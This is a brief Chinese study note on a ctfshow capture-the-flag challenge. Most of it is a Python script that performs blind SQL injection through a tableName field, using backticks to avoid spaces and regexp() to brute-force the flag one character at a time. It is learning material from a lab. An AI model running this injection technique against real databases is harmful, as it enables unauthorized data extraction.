![[Pasted image 20260408203926.png]]
一道爆破题，在[[ctfshow178sql空格过滤]]的基础上把明文输出给拿掉了
新知识点：
- 反引号可以用来包裹库，表，字段名，一定程度上可以省去空格
- regexp()可以用来正则匹配
脚本：
```
import requests

url = "http://979e41de-13d5-4e82-a9c2-8e9420b5aa4d.challenge.ctf.show/select-waf.php"
flag = "ctfshow"
chars = "abcdefjhigklmnopqrst1234567890_-()&^*%{}"

for i in range(1, 40):
    for c in chars:
        data = {"tableName": f"`ctfshow_user`where`pass`regexp('{flag + c}')"}
        response = requests.post(url, data)
        # xml匹配usercount
        """
            </pre>
            <p style="padding-top: 30px;">查询结果</p>
            <pre class="layui-code">
        //返回用户表的记录总数
            $user_count = 1;
            </pre>
        """
        count = int(response.text.split("$user_count = ")[1].split(";")[0])
        # 清空终端输出
        print("\033c", end="")
        print(flag + c)
        if count > 0:
            flag += c
            print(flag)
        if flag.endswith("}"):
            break

```
